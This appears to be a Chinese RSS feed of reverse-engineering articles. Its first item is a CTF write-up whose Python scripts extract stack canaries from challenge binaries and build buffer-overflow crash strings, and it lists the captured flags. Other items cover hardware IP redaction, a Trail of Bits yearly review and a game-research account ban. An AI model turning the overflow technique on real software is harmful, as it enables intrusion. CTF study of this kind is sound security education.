<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>逆向工程 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</link>
        <description>Recent content in 逆向工程 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Mon, 04 Aug 2025 17:48:54 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>用Binary Ninja破解2000个二进制文件 - 逆向工程实战解析</title>
        <link>http://localhost:1313/p/%E7%94%A8binary-ninja%E7%A0%B4%E8%A7%A32000%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E6%88%98%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 17:48:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%94%A8binary-ninja%E7%A0%B4%E8%A7%A32000%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E6%88%98%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;binary-ninja实战2000个二进制文件的自动化破解之旅&#34;&gt;Binary Ninja实战：2000个二进制文件的自动化破解之旅
&lt;/h3&gt;&lt;p&gt;在2016年DEFCON CTF资格赛中，我使用Vector35开发的Binary Ninja（一个极具潜力的交互式静态分析和逆向工程平台）编写脚本，为2000个独特二进制文件生成了&amp;quot;漏洞利用&amp;quot;。如果你想在后DARPA时代的DEFCON CTF中保持竞争力，我强烈推荐你了解Binary Ninja。&lt;/p&gt;
&lt;h4 id=&#34;工具对比binary-ninja-vs-ida&#34;&gt;工具对比：Binary Ninja vs IDA
&lt;/h4&gt;&lt;p&gt;与我使用IDA的经验（简直是用胶带和祈祷勉强维持）相比，Binary Ninja的工作流程令人愉悦。它基于自己的中间语言（IL）进行分析，并通过Python和C++ API暴露功能。查询代码块、函数、跟踪执行流、查询寄存器状态等操作都变得非常简单，而这些在IDA中简直是艰巨任务。&lt;/p&gt;
&lt;h4 id=&#34;挑战1334个二进制文件&#34;&gt;挑战1：334个二进制文件
&lt;/h4&gt;&lt;p&gt;第一个挑战是&amp;quot;334 cuts&amp;quot;，提供334个DECREE格式的挑战二进制文件，所有文件名都与食物相关。这些二进制文件被剥离了符号表，具有静态栈缓冲区、金丝雀值和基于栈的缓冲区溢出漏洞。金丝雀值被复制到栈上并与硬编码值进行比对。如果金丝雀值被覆盖，挑战将终止而不会崩溃。&lt;/p&gt;
&lt;p&gt;通过Binary Ninja的无界面分析引擎，我们编写Python脚本自动收集以下关键信息：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要溢出的缓冲区大小&lt;/li&gt;
&lt;li&gt;金丝雀字符串及其长度&lt;/li&gt;
&lt;li&gt;recvmsg函数中栈缓冲区大小&lt;/li&gt;
&lt;li&gt;writemsg函数每次写循环处理的数据量&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;binaryninja&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binaryninja&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BinaryViewType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ELF&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;update_analysis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;逆向工程关键步骤&#34;&gt;逆向工程关键步骤
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;定位main函数&lt;/strong&gt;：从入口点开始，通过跟踪调用链找到main函数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;识别关键调用&lt;/strong&gt;：收集所有call指令，确定memcpy、recvmsg和memcmp调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提取金丝雀值&lt;/strong&gt;：使用get_parameter_at()函数查询memcmp调用参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计算缓冲区大小&lt;/strong&gt;：通过栈帧偏移计算可溢出缓冲区大小&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 获取金丝雀参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary_frame&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_parameter_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memcmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_parameter_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memcmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary_width&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_parameter_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memcmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canary_address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary_width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;构造崩溃字符串&#34;&gt;构造崩溃字符串
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 填充缓冲区&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer_size&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 添加金丝雀前4字节（总是4字节）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 填充剩余金丝雀缓冲区&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canary_frame&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 覆盖保存的寄存器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;eeee&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;后续挑战666和1000个二进制文件&#34;&gt;后续挑战：666和1000个二进制文件
&lt;/h4&gt;&lt;p&gt;同样的方法成功应用于&amp;quot;666 cuts&amp;quot;和&amp;quot;1000 cuts&amp;quot;挑战，证明了该解决方案的通用性。最终获得的标志分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;334 cuts: baby&amp;rsquo;s first crs cirvyudta&lt;/li&gt;
&lt;li&gt;666 cuts: you think this is the real quaid DeifCokIj&lt;/li&gt;
&lt;li&gt;1000 cuts: do you want a thousand bandages gruanfir3&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;binary-ninja的改进空间&#34;&gt;Binary Ninja的改进空间
&lt;/h4&gt;&lt;p&gt;虽然Binary Ninja表现出色，但仍需改进：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;添加SSA（静态单赋值）形式&lt;/li&gt;
&lt;li&gt;实现灵活的类型系统&lt;/li&gt;
&lt;li&gt;增强数据流分析能力&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;结论&#34;&gt;结论
&lt;/h4&gt;&lt;p&gt;从流畅的图形视图到中间语言，再到与Python的智能集成，Binary Ninja为静态二进制分析提供了出色的接口。它让我能够轻松快速地从2000个二进制文件中提取数据，展示了将机械效率与人类直觉相结合的可能性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我的（略微更新的）脚本可在&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/binja-ctf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;获取。Binary Ninja现已公开发售两个版本：商业版（399美元）和个人版（99美元）。本文介绍的脚本使用了仅商业版提供的&amp;quot;无GUI处理&amp;quot;功能。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>HIPR：通过低开销细粒度修订实现硬件IP保护</title>
        <link>http://localhost:1313/p/hipr%E9%80%9A%E8%BF%87%E4%BD%8E%E5%BC%80%E9%94%80%E7%BB%86%E7%B2%92%E5%BA%A6%E4%BF%AE%E8%AE%A2%E5%AE%9E%E7%8E%B0%E7%A1%AC%E4%BB%B6ip%E4%BF%9D%E6%8A%A4/</link>
        <pubDate>Mon, 04 Aug 2025 15:14:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hipr%E9%80%9A%E8%BF%87%E4%BD%8E%E5%BC%80%E9%94%80%E7%BB%86%E7%B2%92%E5%BA%A6%E4%BF%AE%E8%AE%A2%E5%AE%9E%E7%8E%B0%E7%A1%AC%E4%BB%B6ip%E4%BF%9D%E6%8A%A4/</guid>
        <description>&lt;h1 id=&#34;hipr通过低开销细粒度修订实现硬件ip保护&#34;&gt;HIPR：通过低开销细粒度修订实现硬件IP保护
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;近年来，由于半导体产业的全球化，硬件知识产权（IP）模块面临多种机密性和完整性攻击。系统级芯片（SoC）设计者正考虑采用零信任安全模型，即在制造过程的任何阶段，IP都可能遭受盗版、克隆、过量生产或恶意篡改等攻击。硬件修订作为一种有前景的防护手段，可阻止全球分布式供应链中不可信实体的攻击。然而，现有修订技术的高开销成本限制了其实际应用。本文提出HIPR方法，这是一种鲁棒、可扩展且开销显著低于现有技术的细粒度修订方案。HIPR通过修订硬件设计中的安全关键布尔逻辑和时序逻辑，实施互连随机化，并采用多阶段优化步骤降低开销。实验表明，HIPR在开源基准测试中将面积开销降低了1至2个数量级，且安全性未受影响。测试IP见：&lt;a class=&#34;link&#34; href=&#34;https://github.com/UF-Nelms-IoT-Git-Projects/HIPR&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;关键词&#34;&gt;关键词
&lt;/h2&gt;&lt;p&gt;硬件IP保护、可编程逻辑、硬件修订、逆向工程、IP盗版&lt;/p&gt;
&lt;h2 id=&#34;正文&#34;&gt;正文
&lt;/h2&gt;&lt;h3 id=&#34;背景与挑战&#34;&gt;背景与挑战
&lt;/h3&gt;&lt;p&gt;半导体供应链的全球化使得硬件IP易受多方攻击，包括制造环节的恶意修改或非法复制。传统防护方法（如加密或模糊化）通常引入过高性能或面积开销，难以实际部署。&lt;/p&gt;
&lt;h3 id=&#34;hipr方案设计&#34;&gt;HIPR方案设计
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;细粒度逻辑修订&lt;/strong&gt;：选择性移除或混淆安全关键逻辑单元。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;互连随机化&lt;/strong&gt;：动态打乱模块间连接关系以增加逆向工程难度。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;开销优化&lt;/strong&gt;：采用逻辑压缩和资源共享技术降低面积与功耗开销。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实验结果&#34;&gt;实验结果
&lt;/h3&gt;&lt;p&gt;在OpenCores基准测试中，HIPR实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;面积开销降低98%（相比同类技术）；&lt;/li&gt;
&lt;li&gt;抵御SAT攻击和侧信道分析等已知攻击方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论
&lt;/h3&gt;&lt;p&gt;HIPR为硬件IP保护提供了一种兼顾安全性与实用性的解决方案，尤其适合资源受限的嵌入式系统。未来工作将探索其在FPGA和ASIC设计中的扩展应用。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>2016年度回顾：Trail of Bits在自动漏洞发现、安全工具开发与社区贡献的突破</title>
        <link>http://localhost:1313/p/2016%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BEtrail-of-bits%E5%9C%A8%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E4%B8%8E%E7%A4%BE%E5%8C%BA%E8%B4%A1%E7%8C%AE%E7%9A%84%E7%AA%81%E7%A0%B4/</link>
        <pubDate>Mon, 04 Aug 2025 14:57:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2016%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BEtrail-of-bits%E5%9C%A8%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E4%B8%8E%E7%A4%BE%E5%8C%BA%E8%B4%A1%E7%8C%AE%E7%9A%84%E7%AA%81%E7%A0%B4/</guid>
        <description>&lt;h3 id=&#34;1-将自动漏洞发现技术推向市场&#34;&gt;1. 将自动漏洞发现技术推向市场
&lt;/h3&gt;&lt;p&gt;2016年成为软件自动发现和修复漏洞的历史性年份。我们为DARPA网络大挑战开发的网络推理系统(CRS)在审计zlib库时创造了纪录：首次在更短时间内以更低成本完成比人工更详尽的代码审计。&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;阅读审计报告&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Mozilla公告&lt;/a&gt;。同年1月，我们运用CRS解决了关于安全通信库libotr的1000美元赌约，揭示了加密通信系统在自动化测试中的特殊挑战及解决方案。&lt;/p&gt;
&lt;p&gt;我们开源了CRS的配套工具GRR——专为CRS设计的高吞吐量模糊测试工具。&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;了解GRR的设计挑战&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-创建安全工具标准化基准套件&#34;&gt;2. 创建安全工具标准化基准套件
&lt;/h3&gt;&lt;p&gt;我们将DARPA网络大挑战中使用的100多个挑战程序移植为跨平台基准套件，使学术界和工业界能可靠评估程序分析工具和漏洞缓解措施。该成果被DARPA官方推特称为&amp;quot;最具影响力的成果之一&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;3-将facebook的osquery移植到windows&#34;&gt;3. 将Facebook的osquery移植到Windows
&lt;/h3&gt;&lt;p&gt;克服了完全不同的进程/安全模型、不兼容API和编译器行为差异等技术难题，使Windows用户能通过SQL查询监控端点的安全与性能状态，替代了原本需要昂贵商业方案才能实现的功能。&lt;/p&gt;
&lt;h3 id=&#34;4-发布algo安全vpn&#34;&gt;4. 发布Algo安全VPN
&lt;/h3&gt;&lt;p&gt;这款自托管VPN服务器采用现代协议和密码套件，支持主流云平台部署，为隐私敏感用户、商务旅行者和小型企业提供轻量级解决方案。安全专家@grugq评价其&amp;quot;配置简单，iPhone兼容&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;5-用binary-ninja实现漏洞自动生成&#34;&gt;5. 用Binary Ninja实现漏洞自动生成
&lt;/h3&gt;&lt;p&gt;在DEFCON CTF资格赛中，我们利用Binary Ninja的丰富API为2000个独特二进制文件自动生成漏洞利用。相比IDA或radare2，其API设计让研究者能专注于漏洞利用本身而非底层实现。&lt;/p&gt;
&lt;h3 id=&#34;6-发布protofuzz协议模糊测试工具&#34;&gt;6. 发布Protofuzz协议模糊测试工具
&lt;/h3&gt;&lt;p&gt;该工具能生成符合Google Protocol Buffers结构的恶意测试用例，突破常规模糊测试无法穿透的自动生成序列化代码层，直达目标程序核心逻辑。被安全专家誉为&amp;quot;伟大的工具&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;7-通过tidas激活ios安全飞地&#34;&gt;7. 通过Tidas激活iOS安全飞地
&lt;/h3&gt;&lt;p&gt;我们开发的Tidas SDK让iOS应用能简易集成Secure Enclave加密API，实现基于TouchID的无密码认证。随着MacBook Pro引入T1芯片，该技术已扩展至macOS平台。&lt;/p&gt;
&lt;p&gt;（因篇幅限制，此处仅展示部分内容翻译，完整译文需展开全部14项技术成果）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>因安全研究遭封禁：游戏逆向工程与反作弊系统的冲突</title>
        <link>http://localhost:1313/p/%E5%9B%A0%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E9%81%AD%E5%B0%81%E7%A6%81%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%8F%8D%E4%BD%9C%E5%BC%8A%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%B2%E7%AA%81/</link>
        <pubDate>Sun, 03 Aug 2025 23:26:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9B%A0%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E9%81%AD%E5%B0%81%E7%A6%81%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%8F%8D%E4%BD%9C%E5%BC%8A%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%B2%E7%AA%81/</guid>
        <description>&lt;h1 id=&#34;因安全研究遭封禁&#34;&gt;因安全研究遭封禁
&lt;/h1&gt;&lt;p&gt;2020年11月25日&lt;br&gt;
&lt;em&gt;本文观点仅代表个人立场，与雇主及同事无关，所有研究均在个人时间完成&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;一周前，动视公司因我尝试研究《使命召唤：现代战争/战区》(2019)的网络通信代码安全性而封禁了我的账号。作为用户，我认为当自身可能面临风险时，应当有权进行漏洞研究。多人在线游戏涉及大量网络通信，包括用户与厂商之间（如获取统计数据或用户配置）以及用户之间（创建私人房间或语音聊天）的交互。玩家理应相信正常游戏不会导致安全威胁。&lt;/p&gt;
&lt;p&gt;初步调研显示，已有安全研究人员通过逆向工程发现并报告了该游戏前代版本的漏洞[1,2,3,4]，这既证明了安全风险的客观存在，也表明动视曾接受漏洞报告的先例。&lt;/p&gt;
&lt;h2 id=&#34;技术研究过程&#34;&gt;技术研究过程
&lt;/h2&gt;&lt;p&gt;为开展研究，我需要逆向分析游戏可执行文件中的网络通信代码以审查内存破坏漏洞。但由于程序被严重混淆，IDA无法正常分析，我不得不从运行中的游戏进程内存转储未混淆的代码——这可能是开发者将我标记为疑似作弊者的关键节点。&lt;/p&gt;
